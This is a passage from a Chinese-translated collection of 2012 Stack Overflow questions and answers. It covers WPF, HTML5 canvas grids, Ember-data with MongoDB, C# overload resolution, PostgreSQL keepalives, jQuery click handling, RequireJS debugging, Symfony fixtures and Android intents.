read POSIX file "/tmp/test.txt" as «class utf8» 
```

`as text`, `as string`, 并且[自 10.5 以来](http://developer.apple.com/library/mac/#releasenotes/AppleScript/RN-AppleScript/RN-10_5/RN-10_5.html#//apple_ref/doc/uid/TP40000982-CH105-SW1)`as Unicode text`一直是等效的。

# c# - 断开图像：指定的视觉对象已经是另一个视觉对象的子对象或 CompositionTarget 的根

> ID：11735845
> 
> 赞同：0
> 
> 时间：2012-07-31T08:14:59.443
> 
> 标签：c#, wpf, image, children, disconnect

我正在尝试在 WPF 中创建纸牌游戏，但出现错误：指定的视觉对象已经是另一个视觉对象的子对象或 CompositionTarget 的根。我有一个带有列表视图的窗口（名为：handListview）。列表视图的 itemssource 设置为

```
ObservableCollection<System.Windows.Controls.Image> 
```

叫_hand。

当我悬停图像时，它会通过 mousemove 事件将悬停的图像源添加到播放画布旁边的 Image 控件（称为 LargeCardPreview）.source 来显示悬停图像的放大。

当我双击一个图像时，我会将它从 _hand 中删除并作为子元素添加到名为 playCanvas 的播放画布中。（我使用 playCanvas.Children.Add）。

这就是问题所在，当我双击图像时，我从 _hand 集合中删除了卡片（起初认为这会将元素与 HandListView 断开连接，因为它已绑定到集合），并触发“OnCardPlayed”事件. 在此，我什至将卡片添加到 playCanvas.Children 集合中。但后来我得到了错误。

我认为这可能是因为 LargeImagePreview 阻止了它，所以我将源设置为 Null。没变。

所以我猜是因为即使我从 _hand observablecollection 中取出卡片，图像也不会立即断开连接。那么如何强制断开连接呢？

希望我的问题足够清楚。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T09:16:40.393

您应该考虑发布相关的代码部分，而不是仅仅试图描述您的程序做了什么。

但是，您的方法存在一个普遍问题。当您还打算在应用程序的其他位置显示这些图像时，不应将[图像控件用作 ListView 项。](http://msdn.microsoft.com/en-us/library/ms610982)使用[ImageSource](http://msdn.microsoft.com/en-us/library/system.windows.media.imagesource)作为项目类型（设置`ItemsSouce`为`ObservableCollection<ImageSource>`）并为您的 ListView 定义适当的[ItemTemplate](http://msdn.microsoft.com/en-us/library/system.windows.controls.itemscontrol.itemtemplate)。

```
<ListView>
    <ListView.ItemTemplate>
        <DataTemplate>
            <Image Source="{Binding}"/>
        </DataTemplate>
    </ListView.ItemTemplate>
</ListView> 
```

现在，例如，当您将 ListView 添加`SelectedItem`到 Canvas 时，您将创建一个新的 Image 控件：

```
Image image = new Image { Source = list.SelectedItem as ImageSource };
Canvas.SetLeft(image, ...);
Canvas.SetTop(image, ...);
canvas.Children.Add(image); 
```

# html - 在 Canvas HTML5 上绘制网格/表格

> ID：11735856
> 
> 赞同：14
> 
> 时间：2012-07-31T08:15:31.050
> 
> 标签：html, canvas, html5-canvas

我一直在到处搜索，但找不到如何在 HTML5 Canvas 上绘制网格/表格。我是 HTML5 和画布的新手。

我知道如何绘制形状，但这个绘图网格需要永远理解。

有人可以帮我吗？非常感谢您的时间。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-07-31T08:34:04.930

答案取自此处[使用看起来被拉伸的 <canvas> 元素绘制的网格](https://stackoverflow.com/questions/4172246/grid-drawn-using-a-canvas-element-looking-stretched)

稍微修改了一下，希望对你有帮助

```
<html>
<head>
<script type="text/javascript" language="javascript">
// Box width
var bw = 400;
// Box height
var bh = 400;
// Padding
var p = 10;

var canvas = document.getElementById("canvas");
var context = canvas.getContext("2d");
function drawBoard(){
    for (var x = 0; x <= bw; x += 40) {
        context.moveTo(0.5 + x + p, p);
        context.lineTo(0.5 + x + p, bh + p);
    }

    for (var x = 0; x <= bh; x += 40) {
        context.moveTo(p, 0.5 + x + p);
        context.lineTo(bw + p, 0.5 + x + p);
    }
    context.strokeStyle = "black";
    context.stroke();
}

drawBoard();
</script>
</head>
<body style=" background: lightblue;">
    <canvas id="canvas" width="420px" height="420px" style="background: #fff; margin:20px"></canvas>
</body>
</html> 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-06-28T08:57:58.607

这也可以写成：

```
<html>
<head>

</head>
<body style=" background: lightblue;">
    <canvas id="canvas" width="420px" height="420px" style="background: #fff;     magrin:20px;"></canvas>
    <script type="text/javascript" language="javascript">
    var bw = 400;
    var bh = 400;
    var p = 10;
    var cw = bw + (p*2) + 1;
    var ch = bh + (p*2) + 1;

    var canvas = document.getElementById("canvas");
    var context = canvas.getContext("2d");
    function drawBoard(){
        for (var x = 0; x <= bw; x += 40) {
            context.moveTo(0.5 + x + p, p);
            context.lineTo(0.5 + x + p, bh + p);
        }

        for (var x = 0; x <= bh; x += 40) {
            context.moveTo(p, 0.5 + x + p);
            context.lineTo(bw + p, 0.5 + x + p);
        }

        context.strokeStyle = "black";
        context.stroke();
    }

    drawBoard();
    </script>
</body>
</html> 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2020-11-12T10:55:11.990

```
// Box width
var bw = 270;
// Box height
var bh = 180;
var canvas = document.getElementById("canvas");
var context = canvas.getContext("2d");
function drawBoard(){
    context.lineWidth = 10;
    context.strokeStyle = "rgb(2,7,159)";
    for (var x = 0; x < bw; x += 90) {
        for (var y = 0; y < bh; y += 90) {
           context.strokeRect(x+10, y+10, 90, 90); 
        }
    }
}
drawBoard(); 
```

# mongodb - emberdata 和 mongodb 嵌入对象 ID 未定义

> ID：11735858
> 
> 赞同：3
> 
> 时间：2012-07-31T08:15:36.120
> 
> 标签：mongodb, ember.js, ember-data

我对 Ember 数据和 Mongodb 嵌入对象有疑问。这是我的模型：

```
App.Contact = App.Entity.extend({
    name             : DS.attr('string'),
    firstname        : DS.attr('string'),
    additional_names : DS.attr('string'),
    civility         : DS.attr('string'),
    birthday         : DS.attr('date'),
    organization     : DS.belongsTo('App.Organization'),
    role             : DS.attr('string'),
    photo_source     : DS.attr('string'),
    photo_uri        : DS.attr('string'),
    gravatar_mail    : DS.attr('string'),
    addresses        : DS.hasMany('App.Address', { embedded: true }),
    emails           : DS.hasMany('App.Email', { embedded: true }),
    phones           : DS.hasMany('App.Phone', { embedded: true })
}); 
```

现在我正在通过 API 获取联系人： (GET /app/api/v1/contact/4f86c4774ab63c2417000001/) 这是我得到的：

```
{
    "additional_names": null,
    "addresses": [],
    "birthday": null,
    "civility": null,
    "emails": [
        {
            "email": "alexandre@test.com",
            "label": null,
            "resource_uri": "/app/api/v1/contact/4f86c4774ab63c2417000001/emails/0/",
            "type": "HOME"
        }
    ],
    "firstname": "Alexandre",
    "gravatar_mail": null,
    "groups": [],
    "id": "4f86c4774ab63c2417000001",
    "name": "Simoui",
    "organization": null,
    "phones": [],
    "photo_source": null,
    "photo_uri": "/static/img/nophoto.png",
    "resource_uri": "/app/api/v1/contact/4f86c4774ab63c2417000001/",
    "role": null
} 
```

我的“根”对象有一个 id，但嵌入的对象“电子邮件”没有。因为在 mongodb 中，没有在子文档上设置 id，而只在根文档上设置。

这样 ember-data 会看到“电子邮件”对象没有 id，然后它会尝试通过 API 获取完整的对象。例如：GET /app/api/v1/email/set// 404（未找到）

为了确定这是一个赖特问题，我尝试返回带有假 ID 字段的 Mongodb 子文档。喜欢：（请参阅电子邮件对象的区别）

```
{
    "additional_names": null,
    "addresses": [],
    "birthday": null,
    "civility": null,
    "emails": [
        {
            "id": 431,
            "email": "alexandre@test.com",
            "label": null,
            "resource_uri": "/app/api/v1/contact/4f86c4774ab63c2417000001/emails/0/",
            "type": "HOME"
        }
    ],
    "firstname": "Alexandre",
    "gravatar_mail": null,
    "groups": [],
    "id": "4f86c4774ab63c2417000001",
    "name": "Simoui",
    "organization": null,
    "phones": [],
    "photo_source": null,
    "photo_uri": "/static/img/nophoto.png",
    "resource_uri": "/app/api/v1/contact/4f86c4774ab63c2417000001/",
    "role": null
} 
```

然后我没有问题一切都很好。所以我的问题是：有没有办法解决它？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T02:45:36.793

我已经开始尝试一种解决方法。我只在只读的基础上使用没有 ID 的嵌入对象，所以我没有测试保存、创建和正确的模型状态管理（isDirty 等）......但到目前为止，这已经解决了我的类似问题。

不幸的是，我需要修改 ember-data 源。请参阅[我](https://github.com/kbullaughey/data)的 ember-data 分支。

我的更改范围涉及修改`hasAssociation()`. `DS.hasMany`我所做的是在访问关联的计算属性第一次返回时注入假 ID。我在闭包中保留了一个客户端 ID 计数器，`injectedIdCounter`它定义`hasAssociation()`了一个获取 ID 和更新计数器的函数。然后我定义了一个新选项，`trueEmbedded`它是一个没有 ID 的嵌入式子文档。每次`get()`调用关联时，都会检查元素的 ID，如果 id 不存在，则注入一个。如果已添加 ID，则`set()`需要调用，以便将修改后的关联存储回父对象。这至少解决了我的问题。这是我的代码。

```
var injectedIdCounter = 1;
var getInjectedId = function() {
  return injectedIdCounter++;
};

var hasAssociation = function(type, options) {
  options = options || {};

  var embedded = options.embedded,
      findRecord = embedded ? embeddedFindRecord : referencedFindRecord;

  var meta = { type: type, isAssociation: true, options: options, kind: 'hasMany' };

  return Ember.computed(function(key, value) {
    var data = get(this, 'data'),
        store = get(this, 'store'),
        ids, id, association;

    if (typeof type === 'string') {
      type = get(this, type, false) || get(window, type);
    }

    key = options.key || get(this, 'namingConvention').keyToJSONKey(key);
    if (options.trueEmbedded) {
      association = get(data, key);
      var injectedIdCount = 0;
      association.forEach(function(item) {
        if (Ember.none(item.id)) {
          item.id = getInjectedId();
          injectedIdCount++;
        }
      });
      if (injectedIdCount > 0) {
        set(data, key, association);
      }
      ids = embeddedFindRecord(store, type, data, key);
    } else {
      ids = findRecord(store, type, data, key);
    }
    association = store.findMany(type, ids || []);
    set(association, 'parentRecord', this);

    return association;
  }).property().cacheable().meta(meta);
}; 
```

您可能会认为嵌入式文档不需要 ID，但 ember-data 首先获取对象的所有 ID，然后获取对象本身的方式，即使对于嵌入式关联也是如此，这意味着需要一些像这样的混乱解决方案。

希望这将在 Ember 的未来版本中得到修复。

干杯，凯文

# c# - 为什么传递整数匹配对象方法而不是前置类型方法

> ID：11735859
> 
> 赞同：2
> 
> 时间：2012-07-31T08:15:37.130
> 
> 标签：c#

> **可能重复：**
> [重载解析和虚方法](https://stackoverflow.com/questions/3674368/overload-resolution-and-virtual-methods)

如果我调用它，为什么要调用对象方法？

```
Classes.Class2 c = new Classes.Class2();
c.GetJ(1);

public class Class1
{
   public virtual void GetJ(int j)
   {

   }
}

class Class2:Class1
{
    public override void GetJ(int j)
    {
       int j3 = 8;
    }

     public void GetJ(object j)
     {
        int j1 = 82;
     }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:37:25.800

请参阅 C# 4.0 规范 ( [https://www.microsoft.com/en-us/download/details.aspx?id=7029](https://www.microsoft.com/en-us/download/details.aspx?id=7029) )

> 7.4 成员查找
> 
> 首先，确定一组名为 N 的可访问成员：
> 
> *   如果 T 是一个类型参数，则该集合是在每个类型中命名为 N 的可访问成员集的并集，该集合被指定为 T 的主要约束或次要约束（第 10.1.5 节），以及可访问成员集在对象中命名为 N。
>     
>     
> *   否则，该集合由 T 中名为 N 的所有可访问（第 3.5 节）成员组成，包括继承成员和对象中名为 N 的可访问成员。如果 T 是构造类型，则通过替换类型参数获得成员集，如 §10.3.2 中所述。**包含 override 修饰符的成员将从集合中排除**。

我不明白这种行为，但这是在规范中，所以它是正确的，即使有点令人不安（而且我有 C++ 背景）......

## 编辑：

这确实是一个重复的问题（正如[Anders Abel](https://stackoverflow.com/users/280222/anders-abel)在他的评论中正确发现的那样）。

有关此行为的解释，请参阅原始的[重载解决方案和虚拟方法。](https://stackoverflow.com/questions/3674368/overload-resolution-and-virtual-methods)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:23:22.187

这种方法

```
public void GetJ(object j)
{
    int j1 = 82;
} 
```

隐藏继承`GetJ(int j)`是因为（这就是事情的工作方式，除了更明确地打算调用哪个方法之外，没有什么可以做的）当有一个适用的非覆盖方法时，*永远不会*使用覆盖范围。所以基本上......你的代码按预期工作。

# postgresql - 如何在 ubuntu 12.04 上释放对应用程序的访问权限

> ID：11735864
> 
> 赞同：1
> 
> 时间：2012-07-31T08:16:19.663
> 
> 标签：postgresql, tomcat, ubuntu, tomcat6, ubuntu-12.04

在 Windows 中，当我停止 tomcat 时，应用程序将释放对数据库的保留，因为应用程序将与 tomcat 一起停止......但在 Ubuntu 中，即使我停止 tomcat 应用程序，它也不会释放对数据库的访问。

我试过了

```
sudo /etc/init.d/tomcat6 stop
sudo service tomcat6 stop 
```

我不能使用 pkill，因为如果我终止进程，甚至与数据库服务器的连接也会被释放。我需要手动启动它。我只想释放应用程序对数据库的访问权限。我该怎么做？

是否有tomcat持有该应用程序？或任何其他暂停的过程？

是什么造成了 Windows 和 Ubuntu 之间的差异？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T11:27:52.107

如果您通过突然杀死它来停止 tomcat，而不是以允许正常关闭的方式停止它，它将无法发送网络数据包来告诉 PostgreSQL 连接已关闭。如果 PostgreSQL 正在监听下一个 tomcat 请求，它将等待很长时间，永远不会有任何线索表明 tomcat 已经死了。

TCP 有一个称为“keepalives”的可配置功能，它使侦听器在连接空闲时定期发送数据包，以测试连接是否仍然良好。查看以“tcp_keepalives_”开头的[连接配置设置](http://www.postgresql.org/docs/9.1/interactive/runtime-config-connection.html#RUNTIME-CONFIG-CONNECTION-SETTINGS)。我建议您尝试以下方法：

```
tcp_keepalives_idle = 60
tcp_keepalives_interval = 1 
```

这将允许 PostgreSQL 在一分钟多一点的时间内检测到断开的连接，而不会造成太多开销。这将告诉 PostgreSQL 在空闲连接上等待 60 秒，然后再发送额外的数据包以测试连接是否仍然良好，并每隔一秒发送重试。（我认为它尝试了九次。）如果没有一个数据包得到应答，PostgreSQL 将关闭连接，进程将优雅地离开。

# java - 如何从枚举中获取消息属性

> ID：11735866
> 
> 赞同：1
> 
> 时间：2012-07-31T08:16:25.247
> 
> 标签：java, jsf

我有一个枚举：

```
 public enum Gender {

       F("Female"),

       M("Male"),

       E("Either");

       private final String description;

       Gender(final String description) {
            this.description = description;
       }

       public String getDescription() {
            return description;
       }
    } 
```

消息属性：

```
 StudyLevel.B=Begin (1-3 semesters)
    StudyLevel.M=Middle (4-6 semesters)
    StudyLevel.E=End (7 and more semesters) 
```

一颗豆子：

```
 private Gender[] genders = Gender.values();
   public Gender[] getGenders() {
      return genders;
   }

   public void setGenders(Gender[] genders) {
      this.genders = genders;
   } 
```

和我的 xhtml 文件：

```
 <p:selectOneRadio id="gender" value="#{cc.attrs.offer.selectedGender}" required="true">
                    <f:selectItems value="#{offerBean.genders}" var="p" itemLabel="#{p.class.simpleName.concat('.').concat(p.name())}"/>
    </p:selectOneRadio> 
```

selectItems的输出文本是StudyLevel.B、StudyLevel.M和StudyLevel.E，但不是Begin（1-3学期）等等。我怎样才能正确获取它？

# database - ER模型中的多对多数据库关系

> ID：11735867
> 
> 赞同：1
> 
> 时间：2012-07-31T08:16:30.247
> 
> 标签：database, database-design

我们如何在 ER 模型中实现多对多关系？

如果这不能做到，为什么以及在实现多对多关系时会出现什么问题？

为什么我们在 ER 模型中将多对多关系转换为一对多关系？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:35:20.790

ER 模型不是实现模型。这是一个分析模型。在 ER 模型中，关系被识别，但它们没有被实现。

在关系模型中，关系由外键引用实现。按照惯例，FK 引用总是指向表的 PK，尽管理论上它们可以指向任何候选键。

许多人绘制带有 FK 的 ER 图，因为它们是在关系模型中。这使得多对多关系需要一个接线盒，就像在关系模型中一样。在纯 ER 中，多对多关系只需要在两个框之间有一条线，两端标有“多”指示符。

纯 ER 与设计无关。许多人实践的 ER 偏向于关系设计。这没什么错，因为大多数人都打算建立一个关系数据库。

# php - 从字符串中提取php中的子网

> ID：11735872
> 
> 赞同：0
> 
> 时间：2012-07-31T08:16:51.407
> 
> 标签：php

我正在使用此代码从字符串中提取 IP 地址：

```
preg_match( '/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/', '192.168.1.1', $right)
echo $right; 
```

现在，如果我想从一个字符串中提取一个子网掩码（例如这个，`192.168.1.1/12`），我该如何使用 pregmatch 呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:19:33.093

试试这个：

```
preg_match( '/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\/(\d{1,3})/', '192.168.1.1/12', $right);
var_dump($right[2]); 
```

# javascript - 在项目中单击两次后如何启动功能？

> ID：11735875
> 
> 赞同：0
> 
> 时间：2012-07-31T08:16:55.497
> 
> 标签：javascript, jquery, menu, click

我为我的项目菜单使用了一个迂回脚本。点击菜单项后我有一些动作。我想在第二次单击此选定项目后触发此操作/功能。你能帮我怎么做吗？

这是我的功能的开始：

```
$('.main_content ul li').bind({click: function(){ 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:18:57.613

API：[http ://api.jquery.com/dblclick/](http://api.jquery.com/dblclick/)

将事件处理程序绑定到“dblclick”JavaScript 事件，或在元素上触发该事件。

希望对您的事业有所帮助`:)`

**代码**

```
$('.main_content ul li').dblclick( function(){

}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T08:19:47.063

*编辑*忽略这一点并使用 Tats_innit 的答案。我可耻地不知道 jQuery 的 dblclick 功能。

```
(function(){
    var state = false;
    $('.main_content ul li').click(function(){
        if( state === false ) state = true;
        if( state ){
            state = false;
            //do other stuff here
        }
    });
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T08:30:51.413

一种方法是手动取消第一次点击：

```
$('.main_content ul li').click(function() {

    if(!$(this).data('clicked-once')) {
        $(this).data('clicked-once', true);
        return; // cancel first execution
    }

    // handler body here

}); 
```

[演示](http://jsfiddle.net/uhGCe/)

另一个可能更简洁的`one`方法是使用绑定监听器的方法：

```
$('.main_content ul li').one('click', function() {
   $(this).click(function() {
      // handler body here
   });
}); 
```

[演示](http://jsfiddle.net/Zg46q/)

当然，如果它是您尝试收听的实际双击，您应该`dblclick`按照 Tats_innit 的建议使用该事件。也就是说，如果您只想在连续两次单击时触发一个事件。使用双击，三个快速单击只会触发一次该功能，而使用上述解决方案，它将触发两次。使用双击，两次点击之间有一些延迟根本不会导致函数触发，而上面的解决方案会导致它触发一次。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-31T08:24:51.327

你可以使用 jQuery 的[切换事件助手](http://api.jquery.com/toggle-event/)，并且只绑定一个函数。排队的东西：

```
function iWantThis2bCalled()
{
}

$("#someId").toggle(function(){}, iWantThis2bCalled); 
```

# javascript - 浏览器中的 RequireJS：如何在不先修改代码的情况下记录变量？

> ID：11735877
> 
> 赞同：3
> 
> 时间：2012-07-31T08:16:57.610
> 
> 标签：javascript, debugging, console, requirejs, js-amd

我在浏览器中使用 RequireJS。我有一些由脚本标签加载的 JS，例如：

```
requirejs(["jquery", "shared", function($, shared) {
  var foo='bar';
} 
```

我想从 Chrome 开发工具中的 JS 控制台打印“foo”的当前值。我怎样才能做到这一点？

**编辑2：**这个问题最初措辞非常含糊 - 对此感到抱歉。澄清一下，我不想停止使用 RequireJS，污染全局，或者提前知道我要调试的是什么。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T08:47:11.360

在 Chrome 或 Firebug 中设置断点以在关闭点中断。然后 Foo 将可用于控制台，直到您恢复脚本执行。

**编辑：**范围仍然很重要。如果变量在 shared 的成员中是私有的，则需要在 shared.js 中设置一个中断，例如，如果我们假设 shared.js 包含：

```
var shared = {
    myFunc: function() {
        var foo = 'bar';
        // break here
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-05-14T12:55:53.533

如果我理解了这个问题，那么使用 RequireJS 的全部意义就在于不使用全局变量！

因此我定义了一个`console.js`这样的模块：

```
define(function() {
  var nativeConsole = {};
  try {
    // for IE 8/9
    if (!window.console) {
      window.console = {
        log:   function() {},
        debug: function() {},
        info:  function() {},
        warn:  function() {},
        error: function() {}
      };
    }
    nativeConsole = console;
  // Firefox throws an exception if you access the console object and it doesn't exist. Wow!
  } catch (e) { }
  return nativeConsole;
}); 
```

然后像这样使用它：

```
requirejs(["jquery", "console", function($, console) {
  var foo='bar';
  console.warn("foo = " + foo);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T08:21:57.447

你可以这样做

```
`requirejs(["jquery", "shared", function($, shared) {   
  var foo=bar;
  console.debug(foo);
}` 
```

同样的命令也适用于 Firefox。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-31T08:25:32.020

JS 控制台已经有了你页面的上下文。只需打开控制台，输入“foo”，然后按 Enter。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-31T08:36:43.753

将 var 定义移到闭包之外。

```
var foo;
requirejs(["jquery", "shared", function($, shared) {
  foo='bar';
}); 
```

这样做的缺点是`foo`现在存在于全局`window`范围内（变量以 存在`window.foo`），应该避免使用全局变量。不过，它对调试很有帮助。或者，只需将其定义`window`为：

```
requirejs(["jquery", "shared", function($, shared) {
  window.foo='bar';
}); 
```

或者，如果您打算这样做并将变量保留在调试阶段之后，您应该考虑为“您的”变量创建自定义命名空间。

```
var myNamespace = {};
requirejs(["jquery", "shared", function($, shared) {
  myNamespace.foo='bar';
}); 
```

然后你就可以了`window.console && console.log(myNamespace.foo)`。

# symfony - symfony2 错误，stty 无法识别

> ID：11735880
> 
> 赞同：0
> 
> 时间：2012-07-31T08:17:03.407
> 
> 标签：symfony, stty

我正在关注[教程](http://www.ens.ro/2012/03/27/symfony2-jobeet-day-3-the-data-model/)。当我使用命令时

```
php app/console doctrine:fixtures:load 
```

然后我收到一个错误

```
C:\wamp\www\Symfony>php app/console doctrine:fixtures:load
'stty' is not recognized as an internal or external command,
operable program or batch file.

  [RuntimeException]

  The autoloader expected class "Symfony\Bundle\DoctrineFixturesBundle\DoctrineF
ixturesBundle" to be defined in file "C:\wamp\www\Symfony\app/../vendor/bundles\
Symfony\Bundle\DoctrineFixturesBundle\DoctrineFixturesBundle.php". The file was
found but the class was not in it, the class name or namespace probably has a ty
po. 
```

我是 symfony2 的新手。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:32:02.467

我注意到的第一个问题是您没有使用`DoctrineFixturesBundle`. 我建议你更新图书馆。

> **警告：命名空间已更改**
> 
> 此捆绑包以前位于`Symfony\Bundle`命名空间下，现在已移至`Doctrine\Bundle`命名空间。

其次，你需要声明`DoctrineFixturesBundle`你的`AppKernel`.

```
// ...
public function registerBundles()
{
    $bundles = array(
        // ...
        // Be carefull with the namespace!
        new \Doctrine\Bundle\DoctrineFixturesBundle\DoctrineFixturesBundle(),
        // ...
    );
    // ...
} 
```

您可以在此处找到更多信息：（[`DoctrineFixturesBundles`](http://symfony.com/doc/current/bundles/DoctrineFixturesBundle/index.html)不是最新的！）

# php - 使用函数解释“自定义代码”

> ID：11735882
> 
> 赞同：0
> 
> 时间：2012-07-31T08:17:20.017
> 
> 标签：php, api, interpreter

我正在尝试创建自己的代码以允许客户端在[像素矩阵](https://github.com/ffraenz/Paperchat)上发布某些内容。

这是一个代码示例： `15e3n:3;geo(386299n283752w):4;delta(16e3n:5;line(20e0n;20e10n;0e10n;color:d);19w55n;rectangle(50w50n;height:100;width:50));88e2n:randomColor()`

我想使用这种情况下的函数来解释这一点`geo`，`delta`, `line`, `rectangle`, `geo`, `randomColor`。`(`写在和之间的东西是`)`参数，用 隔开`;`。（`15e3n`在这种情况下是位置“东 15，北 3”）

例子： `function(param1:value1;param2:value2;value3;value4);function2(param1:value1)`

这些函数应该被执行并且应该用下面的结果替换函数：

文本`16e13n:3;line(17e13n;19e13n;color:4);15e13n:3`应导致`16e13n:3;17e13n:4;18e13n:4;19e13n:4;15e13n:3`. 因为`line`带有参数的函数具有替换输入中的函数`17e13n;19e13n;color:4`的结果。`17e13n:4;18e13n:4;19e13n:4;`

我怎样才能做到这一点？什么是最好的方法？正则表达式？是否有关于如何执行此操作的现有示例？

现在，这看起来有点复杂:)

我提前感谢您在这方面获得帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:49:30.300

注意：内容不是必需的有效 PHP 脚本

我的建议是：

```
5e3n:3;geo(386299n283752w):4;delta(16e3n:5;line(20e0n;20e10n;0e10n;color:d);19w55n;rectangle(50w50n;height:100;width:50));88e2n:randomColor() 
```

首先实现一个解析器将语句分成一个数组。您可以循环每个字符，保存一个括号计数器，然后将其拆分为`;`括号外，从而得到以下数组：

```
array(
    0 => object(prefix => "5e3n", suffix => "3"),
    1 => object(prefix => "geo(386299n283752w)", suffix => "4"),
    2 => object(prefix => "delta(16e3n:5;line(20e0n;20e10n;0e10n;color:d);19w55n;rectangle(50w50n;height:100;width:50))", suffix => ""),
    3 => object(prefix => "88e2n", suffix => "randomColor()")
) 
```

然后提取函数参数，您可能要使用对象...

```
array(
    0 => object(prefix => "5e3n", suffix => "3"),
    1 => object(
        prefix => (object)func(
            name => "geo",
            params => array(
                0 => "386299n283752w"
            )
        ),
        suffix => "4"),
    ),
    2 => object(
        prefix => (object)func(
            name => "delta",
            params => array(
                0 => "16e3n:5",
                1 => "line(20e0n;20e10n;0e10n;color:d)",
                2 => "19w55n",
                3 => "rectangle(50w50n;height:100;width:50)"
            )
        ),
        suffix => ""
    ),
    3 => object(
        prefix => "88e2n",
        suffix => (object)func(
            name => "randomColor",
            params => array()
        )
    )
) 
```

递归执行此操作，直到提取内部深处的所有函数。

然后从深度上，通过根据名称执行适当操作的块将块替换`(object)func`为结果字符串来处理函数`switch`，例如：

```
function processFunc($func){
    switch($func->name){
        case "randomColor":
            return selectRandomColor();
        /* ... */
    }
} 
```

将处理这个：

```
(object)func(
    name => "randomColor",
    params => array()
) 
```

进入这个：

```
"blueColor" 
```

然后最后你会得到一个数组，其中的内容，例如（不直接匹配上面）：

```
array(
    0 => object(prefix => "5e3n", suffix => "3"),
    1 => object(prefix => "6e2n", suffix => "4"),
    2 => object(prefix => "88e2n", suffix => "")
) 
```

然后将它们重新组合成一个结果字符串。

我不会为你写一个完整的脚本，但这里有一个关于如何处理它的想法。虽然这可能不完整，但通过思考你应该能够完成它。

# java - Android - 像 iOS 上的开放协议 (Bonjour)

> ID：11735883
> 
> 赞同：1
> 
> 时间：2012-07-31T08:17:20.313
> 
> 标签：java, android, ios, bonjour, zeroconf

在 iOS 世界中，数据可以通过使用开放协议在应用程序之间进行交换。例如，如果我有一封带有 pdf 附件的电子邮件，我可以将其打开到 PDFExpert，即使应用程序在沙盒上运行并且它们没有共享文件系统。

在 Android 的情况下，我注意到这样的过程是不同的，例如，我可以将文档保存到文件系统中，比如说 /mnt/Apps_Name，然后我可以在其他应用程序中重新打开该文档。

有没有办法让用户体验在 iOS 世界中的应用程序之间交换数据/文档？你有什么例子吗？对官方文档的一些参考？他们是否需要一些 Bonjour 或 Zero Conf 实施？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:28:38.273

也许 Intent 方法是您正在寻找的。通过为 Intent 设置操作，例如 ACTION_VIEW，您在 Intent（即 pdf 文件）中设置相应的数据，系统会确定哪些应用程序能够显示该信息。如果有多个应用程序可以使用，通常会出现一个对话框提示让用户决定应用程序。

查看 PDF 示例：

```
Uri path = Uri.fromFile(file);
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setDataAndType(path, "application/pdf");
startActivity(intent); 
```

Intents 功能是我在 Android 开发中的最爱之一。例如，看看共享任何文件/文本/图像/...是多么容易，而无需实施任何 Oauth/Oauth2...。

```
Intent intent = new Intent(android.content.Intent.ACTION_SEND);
intent.setType("text/plain");
String toShare = "This is the text to share";
// You can add extras
intent.putExtra(android.content.Intent.EXTRA_SUBJECT, "Subject Here");

// Start intent with choose prompt
startActivity(Intent.createChooser(intent, "Share via")); 
```

结果：

![在此处输入图像描述](../Images/aa15a19e77f8670350166fa3e8364362.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-30T20:25:01.540

Android 4.1 添加了[网络服务发现](http://developer.android.com/training/connect-devices-wirelessly/nsd.html)，这应该正是您想要的——似乎实际上是在 Bonjour[的](http://developer.android.com/reference/android/net/wifi/p2p/WifiP2pManager.html)底层实现的。

# c# - 路由附加事件 WPF/MVVM 后丢失 EventArgs

> ID：11735886
> 
> 赞同：3
> 
> 时间：2012-07-31T08:17:25.030
> 
> 标签：c#, wpf, mvvm, event-handling, eventtrigger

我正在做 MVVM 项目，我遇到了这样的问题：在路由一些附加事件之后，我丢失了 EventArgs。对于 RoutingEvent，我使用了以下代码：

```
public class RoutedEventTrigger : EventTriggerBase<DependencyObject>
    {
        RoutedEvent _routedEvent;

        public RoutedEvent RoutedEvent
        {
            get { return _routedEvent; }
            set { _routedEvent = value; }
        }

        public RoutedEventTrigger()
        {
        }
        protected override void OnAttached()
        {
            Behavior behavior = base.AssociatedObject as Behavior;
            FrameworkElement associatedElement = base.AssociatedObject as FrameworkElement;

            if (behavior != null)
            {
                associatedElement = ((IAttachedObject)behavior).AssociatedObject as FrameworkElement;
            }
            if (associatedElement == null)
            {
                throw new ArgumentException("Routed Event trigger can only be associated to framework elements");
            }
            if (RoutedEvent != null)
            {
                associatedElement.AddHandler(RoutedEvent, new RoutedEventHandler(this.OnRoutedEvent));
            }
        }
        void OnRoutedEvent(object sender, RoutedEventArgs args)
        {
            base.OnEvent(args);
        }
        protected override string GetEventName()
        {
            return RoutedEvent.Name;
        }
    } 
```

部分来自 xaml：

```
<ListView>
  <i:Interaction.Triggers>
    <localP:RoutedEventTrigger RoutedEvent="ScrollViewer.ScrollChanged">
      <cmd:EventToCommand Command="{Binding ScrollCommand}" />
    </localP:RoutedEventTrigger>
  </i:Interaction.Triggers> 
```

